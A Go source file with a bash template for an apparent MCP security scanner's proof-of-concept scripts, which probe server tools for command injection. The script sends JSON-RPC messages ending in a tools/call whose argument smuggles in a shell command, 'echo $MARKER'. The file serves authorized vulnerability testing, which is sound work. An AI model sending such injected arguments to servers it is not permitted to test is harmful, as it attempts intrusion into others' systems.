package pocgen

const bashTemplate = `#!/usr/bin/env bash
# MCPwn Proof of Concept - didactic demonstration only
# Tool: {TOOL} | Finding: {RULEID} | Severity: {SEVERITY}
# Confirmed evidence: {EVIDENCE}
# Authorized testing only: run exclusively against servers you own or have written permission to test.
# Usage: bash pocs/{NAME} | {TARGET}
# Expected result: the server output contains the marker shown below.

MARKER="mcpwn_probe_$(date +%s)_$$"

say() {
    echo "$1" >&2
}

say "expected: server output contains marker $MARKER"
printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"MCPwn PoC","version":"1.0.0"}}}'
printf '%s\n' '{"jsonrpc":"2.0","method":"notifications/initialized"}'
printf '%s\n' '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"{TOOL}","arguments":{"{PARAM}":"echo $MARKER"}}}'
say "[+] PoC executed: probe sent, look for marker $MARKER in the server output above"

# Remediation: {REMEDIATION}
`
